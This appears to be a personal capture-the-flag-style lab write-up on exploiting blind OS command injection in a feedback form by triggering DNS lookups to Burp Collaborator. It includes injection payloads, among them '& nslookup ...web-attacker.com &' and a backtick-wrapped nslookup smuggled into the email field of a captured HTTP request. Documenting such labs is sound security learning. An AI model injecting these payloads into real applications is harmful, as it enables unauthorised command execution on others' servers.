# Lab Blind OS command injection with out-of-band interaction

## Objective:

 This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 

## Big Idea:

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

`& nslookup kgji2Ohoyw.web-attacker.com &`

This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring , and thereby detect that the command was successfully injected. 

This is what the landing page looks like.

![[Pasted image 20210923204534.png]]

I visited the "Submit feedback" function which responded with the following page.

![[Pasted image 20210923204605.png]]

One of these user input fields runs a command in the background and is vulnerable to OS command injection. 

Since this lab is focused on out of band techniques, I will start Burp Collaborator. Burp Collaborator acts as a listener and can be used to test out of band command injections. 

To Start Burp Collaborator visit Burp > Burp Collaborator Client

![[Pasted image 20210923204845.png]]

To get my unique subdomain, click "Copy to clipboard"

![[Pasted image 20210923204905.png]]

My unique domain is the following
j8swo5h0vh9kafljvq2tlq72mtsjg8.burpcollaborator.net

Any traffic that gets sent to the above domain will be displayed in my Burp Collaborator client. 

Back to the feedback, page I sent the following values and intercepted the request with Burp Intercept.

![[Pasted image 20210923205331.png]]

![[Pasted image 20210923205344.png]]

I sent the request to repeater and tried injecting a payload which would have the server ping itself 

ping -c 20 127.0.0.1

![[Pasted image 20210923205740.png]]

This payload did not work. 

I will try doing an nslookup on my burp collaborator client

The following command performs the dns request

` nslookup j8swo5h0vh9kafljvq2tlq72mtsjg8.burpcollaborator.net `

The following is what the command injection looks like inside of the http body

` csrf=qinivqp5NIpW6K2K5CO3O0eogtqjfBKf&name=bagelHacks&email=bagelHacks%40hacker.hacker`nslookup+j8swo5h0vh9kafljvq2tlq72mtsjg8.burpcollaborator.net`&subject=test&message=testing+ `

![[Pasted image 20210923205958.png]]


From Burp Collaborator, I can see DNS queries which means the nslookup command was successful on the target web server

![[Pasted image 20210923210037.png]]

![[Pasted image 20210923210051.png]]






